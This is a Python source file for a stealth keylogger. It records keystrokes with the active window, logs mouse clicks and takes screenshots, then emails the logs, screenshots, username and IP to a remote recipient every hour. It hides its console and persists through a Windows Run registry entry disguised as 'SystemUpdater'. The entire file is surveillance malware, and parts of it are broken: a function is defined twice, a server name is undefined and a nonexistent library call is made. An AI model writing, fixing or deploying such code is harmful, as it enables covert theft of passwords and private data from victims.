from email import encoders
from email.mime.base import MIMEBase
import platform
import sys
import threading
import winreg
import pyautogui
from pynput import keyboard, mouse
import datetime 
import os
import getpass
import socket
from cryptography.fernet import Fernet
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import time
import psutil

# Windows-specific imports
if platform.system() == 'Windows':
    import win32gui
    import win32event
    import win32process
    import win32api
    import winerror
    import win32console

# Configuration
LOG_FILE = "log.txt"
ENCRYPTION_LOG_FILE = "encrypted_log.dat"
SCREENSHOT_DIR = "screenshots"
EMAIL_ADDRESS = os.environ.get('MY_APP_EMAIL')
EMAIL_PASSWORD = os.environ.get('MY_APP_PASSWORD')
RECIPIENT_EMAIL = os.environ.get('MY_APP_RECEIVER')
SMTP_PORT = 587
SEND_INTERVAL = 3600
SCREENSHOT_INTERVAL = 300
DELETE_LOGS_AFTER = 7

# Global variable for mutex
_system_mutex = None

# Generate encryption key
def generate_key():
    key = Fernet.generate_key()
    with open("secret.key", "wb") as key_file:
        key_file.write(key)
    return key

# Load encryption key
def load_key():
    if not os.path.exists("secret.key"):
        return generate_key()
    return open("secret.key", "rb").read()

# Encrypt log file
def encrypt_log_file(data, key):
    f = Fernet(key)
    encrypted_data = f.encrypt(data.encode())
    return encrypted_data

# Decrypt log file
def decrypt_log_file(encrypted_data, key):
    f = Fernet(key)
    decrypted_data = f.decrypt(encrypted_data)
    return decrypted_data.decode()

# --- System Info ---
def get_active_window():
    try:
        if platform.system() == 'Windows':
            window = win32gui.GetForegroundWindow()
            _, pid = win32process.GetWindowThreadProcessId(window)
            process_name = psutil.Process(pid).name()
            window_title = win32gui.GetWindowText(window)
            return f"{process_name} - {window_title}"
        else:
            return "Non-Windows System"
    except:
            return "Unknown Window"

# Log keystrokes
def write_to_file(key):
    try:        
        letter = str(key).replace("'", "")

        # Handle special keys
        special_keys = {
            "Key.space": " ",
            "Key.enter": "\n",
            "Key.backspace": "[BACKSPACE]",
            "Key.tab": "[TAB]",
            "Key.caps_lock": "[CAPS]",
            "Key.esc": "[ESC]"
        }
        
        if letter in special_keys:
            letter = special_keys[letter]
        elif "Key." in letter: # Ignore other special keys
            return 

        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        active_window = get_active_window()
        log_entry = f"{timestamp} | {active_window} | {letter}\n"

        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(log_entry)
            
    except Exception:
        pass

# Log mouse clicks
def on_click(x, y, button, pressed):
    if pressed:
        try:
            encryption_key = load_key()
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            active_window = get_active_window()
            log_entry = f"{timestamp} | {active_window} | Mouse Click at: ({x}, {y}) with {button}\n"
            with open(LOG_FILE, "a", encoding = "utf-8") as f:
                f.write(log_entry)
        except Exception:
            pass

# Screenshot function
def take_screenshot():
    try:
        if not os.path.exists(SCREENSHOT_DIR):
            os.makedirs(SCREENSHOT_DIR)
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        screenshot_path = os.path.join(SCREENSHOT_DIR, f"screenshot_{timestamp}.png")

        # Take screenshot
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_path)
        return screenshot_path
    except Exception as e:
        print(f"Error in take_screenshot: {e}")
        return None

# --- Media & Tasks ---
def take_screenshot():
    try:
        if not os.path.exists(SCREENSHOT_DIR):
            os.makedirs(SCREENSHOT_DIR)
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            path = os.path.join(SCREENSHOT_DIR, f"screenshot_{timestamp}.png")
            screenshot = pyautogui.screenshot()
            return path
    except:
        return None

def send_email():
    # Encrypt log file and send email with log and screenshot
    try:
        if not os.path.exists(LOG_FILE):
            return
        enc_key = load_key()
        with open(LOG_FILE, "r", encoding = "utf-8") as f:
            raw_data = f.read()
        
        # Create encrypted log file
        encrypted_content = encrypt_log_file(raw_data, enc_key)
        with open(ENCRYPTION_LOG_FILE, "wb") as f:
            f.write(encrypted_content)

        msg = MIMEMultipart()
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = RECIPIENT_EMAIL
        msg['Subject'] = f"Keylogger Report - {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

        body = f"User: {getpass.getuser()}\nIP: {socket.gethostbyname(socket.gethostbyname(socket.gethostname()))}"
        msg.attach(MIMEText(body, 'plain'))

        # Attach decrypted log file content as email body
        msg.attach(MIMEText(raw_data, 'plain'))

        # Attach new screenshot
        if os.path.exists(SCREENSHOT_DIR):
            files = [os.path.join(SCREENSHOT_DIR, f) for f in os.listdir(SCREENSHOT_DIR)]
            if files:
                lastest_ss = max(files, key = os.path.getctime)
                with open(lastest_ss, "rb") as attachment:
                    part = MIMEBase("application", "octet-stream")
                    part.set_payload(attachment.read())
                    encoders.encode_base64(part)
                    part.add_header("Content-Disposition", f"attachment; filename = {os.path.basename(lastest_ss)}")
                    msg.attach(part)
        # SMTP Send
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.send_message(msg)
        server.quit()
    except Exception as e:
        print(f"Error in send_email: {e}")
def cleanup_logs():
    try:
        now = time.time()
        for folder, _, files in os.walk("."):
            for f in files:
                if f in [LOG_FILE, ENCRYPTION_LOG_FILE] or f.endswith(".png"):
                    path = os.path.join(folder, f)
                    if (now - os.path.gettime(path)) > (DELETE_LOGS_AFTER * 86400):
                        os.remove(path)
    except:
        pass
def periodic_tasks():
        while True:
            take_screenshot()
            send_email()
            cleanup_logs()
            time.sleep(min(SEND_INTERVAL, SCREENSHOT_INTERVAL))

# --- Persistence & Stealth ---
def hide_console():
    if platform.system() == 'Windows':
        try:
            h_console = win32console.GetConsoleWindow()
            if h_console != 0:
                win32gui.ShowWindow(h_console, 0)
        except: pass
    else:
        try:
            if os.fork() > 0: sys.exit(0)
        except: pass

def add_to_startup():
    if platform.system() == 'Windows':
        try:
            path = f'"{sys.executable}" "{os.path.abspath(__file__)}"'
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "SystemUpdater", 0, winreg.REG_SZ, path)
            winreg.CloseKey(key)
        except: pass

def is_already_running():
    global _system_mutex
    if platform.system() == 'Windows':
        _system_mutex = win32event.CreateMutex(None, False, "Global\\SystemUpdaterMutex_v2")
        if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
            return True
    return False

# --- Main ---
def main():
    if is_already_running():
        sys.exit(0)
    
    hide_console()
    add_to_startup()

    if not os.path.exists(SCREENSHOT_DIR):
        os.makedirs(SCREENSHOT_DIR)
    
    # Threading for periodic tasks
    t = threading.Thread(target=periodic_tasks, daemon=True)
    t.start()

    # Start listeners
    with keyboard.Listener(on_press = write_to_file) as k_list, \
            mouse.Listener(on_click = on_click) as m_list:
        k_list.join()
        m_list.join()

if __name__ == "__main__":
    main()
